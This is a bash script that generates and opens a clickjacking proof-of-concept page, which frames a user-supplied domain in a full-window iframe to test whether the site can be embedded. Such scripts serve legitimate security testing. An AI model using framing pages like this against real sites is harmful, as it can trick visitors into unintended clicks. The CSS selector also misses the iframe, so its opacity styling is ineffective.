#! /bin/bash
read -p "Enter domain (eg: test.com) : " dom
echo " <html>
<head>
<title>clickjacking_poc for $dom </title>
<style>
frame {
opacity: 0.5;
border: none;
position: absolute;
top: 0px;
left: 0px;
z-index: 1000;
}
</style>
</head>
<body>
<script>
window.onbeforeunload = function()
{
return " Do you want to leave ?";
}
</script>
<p> site is vulnerable for Clickjacking !</p>
<iframe id="frame" width="100%" height="100%" src="https://www.$dom"></iframe>
</body>
</html>
" > clickjacking_poc.html
read -p "Do you want to save the PoC ?(Y/N)[Enter = NO] : " save
case $save in
	N )
	firefox clickjacking_poc.html
	sleep 5
	rm clickjacking_poc.html
	;;
	NO )
	firefox clickjacking_poc.html
	sleep 2
	rm clickjacking_poc.html
	;;
	Y )
	echo "saved as clickjacking_poc.html at $PWD"
	sleep 2 
	firefox clickjacking_poc.html
	;;
	YES )
	echo "saved as clickjacking_poc.html at $PWD" 
	sleep 2
	firefox clickjacking_poc.html
	;;
	*)
	echo "PoC not saved"
	firefox clickjacking_poc.html
	sleep 2
	rm clickjacking_poc.html

esac
